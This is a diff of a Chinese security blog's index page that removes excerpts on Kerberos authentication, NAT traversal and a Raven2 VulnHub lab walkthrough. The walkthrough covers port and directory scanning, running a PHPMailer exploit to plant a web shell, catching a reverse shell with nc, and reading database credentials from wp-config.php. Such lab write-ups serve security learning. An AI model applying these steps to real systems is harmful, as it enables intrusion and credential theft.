-<p>请求包:用户名、主机名、加密类型和Authenticator以及一些其他信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名+主机名+authenticator（用户hash(timestamp)）</span><br></pre></td></tr></table></figure>
-
-<p> <strong>2.AS-REP</strong></p>
-<p>KDC接收到请求后，通过AD活动目录查询得到该用户的密码Hash，用该密码HASH对请求包的Authenticator进行解密，如果解密成功，则证明请求者提供的密码正确，而且需要时间戳范围在五分钟内，于是预认证(preauth)成功，校验时间是为了防止重放。</p>
-<p>响应包：TGT和用户NTML-Hash加密的Login Session Key以及一些其他信息以及PAC。Login Session Key 用于在下阶段的交互中的数据加密。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TGT:krbtgt hash(Login session key,client info)</span><br><span class="line">TGT+用户hash(Login Session Key)+info(PAC等)</span><br></pre></td></tr></table></figure>
-
-<p><strong>3.TGS-REQ</strong></p>
-<p>客户端向KDC申请针对指定服务的ST服务票据请求。</p>
-<p>请求包：客户端信息、authenticator、TGT认购凭证和访问的服务名以及一些其他信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info+authenticator(login session key(time)stamp)+TGT+service name</span><br></pre></td></tr></table></figure>
-
-<p><strong>4.TGS-REP</strong></p>
-<p>TGS接受到请求之后，检查自身是否存在客户端所请求的服务。如果服务存在，使用krbygt_NTML_Hash解密TGT获取Login Session Key解密 Authenticator， 若解密成功，则验证了客户端身份， 同时还会验证时问戳是否合法，防⽌重放。并且还会检查TGT中的时间戳是否过期，原始地址是否和TGT中保存的 地址相同，这⾥的地址主要指的是主机名。 </p>
-<p>如果验证通过，KDC会⽣成⼀个⽤Logon Session Key加密后的⽤于确保客户端-服务器之间通信安全的Service Session Key会话秘钥。并且会为该客户端⽣成ST服务票据。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ST：service hash(client info,service session key)</span><br><span class="line">响应包:Login session Key(service session key)+ST</span><br></pre></td></tr></table></figure>
-
-<p><strong>5.AP-REQ</strong></p>
-<p>客户端接收到TGS回复后，通过步骤2中Login Session Key解密得到原始Service Session Key，同时它也拿到了 ST(Service Ticket)服务票据。该Serivce Session Key 和 ST服务票据 会被客户端缓存。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authenticator: 由service session key 加密的用户信息和时间轴</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求包(请求对象为业务服务器):authenticator + ST</span><br></pre></td></tr></table></figure>
-
-<p><strong>6.AP-REP</strong></p>
-<p>服务器在接收到请求之后，先通过该服务的NTLM Hash哈希解密ST服务票据，并从中提取 Service Session Key。 然后通过提取出来的Service Session Key 解密Authenticator，进⽽验证了客户端的真实身份。</p>
-<p> 验证了客户端的身份后，服务端使⽤PAC发送给KDC验证该⽤户的权限。KDC通过SID判断⽤户的⽤户组信息，⽤户权限，最终将结果返回给服务端。最终客户端根据KDC的验证结果进⾏访问服务。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">双向验证 :访问者和被访问者互相验证对⽅的身份。客户端验证服务器--服务端⽤ Service Session Key加密时问戳 作为Authenticator，发送给客户端。客户端使⽤ Service Session Key解密authenticator，如果解密成功，则可以 验证服务器的合法 性。双向认证过后，开始了服务资源的访问。</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220227231134708.png" alt="image-20220227231134708"></p>
-
+        
+          <a class="article-more-a" href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/#more">more >></a>
+        
       
 
       
@@ -1203,63 +712,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="Raven2靶机渗透"><a href="#Raven2靶机渗透" class="headerlink" title="Raven2靶机渗透"></a>Raven2靶机渗透</h1><p>因为头一次涉及到liunx mysqludf的提权，所以这一次对该靶机进行一次完整的渗透测试。</p>
-<p>靶机地址：</p>
-<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/raven/Raven2.ova">https://download.vulnhub.com/raven/Raven2.ova</a></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225103226230.png" alt="image-20220225103226230"></p>
-<p>搭建好并开机就好了。</p>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.137.0/24 -sP 进行ping扫描</span><br></pre></td></tr></table></figure>
-
-<p>实现对网段的快速扫描</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225103456133.png" alt="image-20220225103456133"></p>
-<p>这里自己知道新靶机地址为192.168.137.143.</p>
-<p>再一次用nmap综合扫描该ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.137.143</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104202348.png" alt="image-20220225104202348"></p>
-<p>使用浏览器访问该IP地址，发现是一个奇奇怪怪的网页。想到网页就想先扫cms，使用whatweb扫描该网址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.137.143</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104353186.png" alt="image-20220225104353186"></p>
-<p>但是发现不了该网站的cms。</p>
-<p>于是使用目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.137.143:80</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104437436.png" alt="image-20220225104437436"></p>
-<p>扫描的东西很多很多，只有一个个看，一个个点，访问到了vendor目录。并且在/PATH文件下找到了第一个flag</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225104554872.png" alt="image-20220225104554872"></p>
-<p>同时多做信息收集，可以发现该网站上搭建了phpmailer这个服务。</p>
-<h2 id="2-拿到权限"><a href="#2-拿到权限" class="headerlink" title="2.拿到权限"></a>2.拿到权限</h2><p>在kali命令行中输入searchsploit phpma13iler，寻找可用的exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220225105340388.png" alt="image-20220225105340388"></p>
-<p>这里我选择按照网上的方法来看，于是使用php/webapps/40974.py</p>
-<p>使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x exploits/php/webapps/40974.py</span><br></pre></td></tr></table></figure>
-
-<p>在本机中找到该文件复制下来，然后修改payload</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171150109.png" alt="image-20220226171150109"></p>
-<p>之后使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 40974.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171021436.png" alt="image-20220226171021436"></p>
-<p>使用nc监听4444端口准备等待反弹shell。访问<code>192.168.137.143/contant.php</code>执行我们得后门，生成后门文件。随后访问<code>192.168.137.143/shell.php</code>得到反弹shell。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171512287.png" alt="image-20220226171512287"></p>
-<p>输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>获得一个类似于交互式得shell。</p>
-<p>之后可以查找flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171822411.png" alt="image-20220226171822411"></p>
-<p>获得第二个flag</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226171905752.png" alt="image-20220226171905752"></p>
-<p>发现第三个flag是在<code>/var/www/html</code>（即表示网站服务下，所以可以直接访问该地址）</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226172412484.png" alt="image-20220226172412484"></p>
-<h2 id="3-UDF提权"><a href="#3-UDF提权" class="headerlink" title="3.UDF提权"></a>3.UDF提权</h2><p>接下来去找寻到/var/www/html/wordpress目录下有一个文件名为<code>wp-config.php</code>的文件。</p>
-<p>可以找到mysql数据库的用户名和密码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220226173258537.png" alt="image-20220226173258537"></p>
-
+        
+          <a class="article-more-a" href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/#more">more >></a>
+        
       
 
       
@@ -1353,84 +808,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-内网穿透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-02-21T08:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="内网穿透的概念"><a href="#内网穿透的概念" class="headerlink" title="内网穿透的概念"></a>内网穿透的概念</h1><p>内网穿透，也叫NAT穿透，进行NAT穿透是为了使具有某一个特定源ip地址和源端口号的数据包不被NAT设备屏蔽而正确路由到内网主机</p>
-<h1 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h1><h2 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h2><p>代理就是中介，A和B之间有一个中间C，C就是中介。</p>
-<p>刚开始的时候，代理多数是帮助内网client访问外网server用的，后来出现了反向代理，“反向”这个词在这儿的意思是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，从外到内。</p>
-        
-          <a class="article-more-a" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">展开全文 >></a>
         </p>
       
 
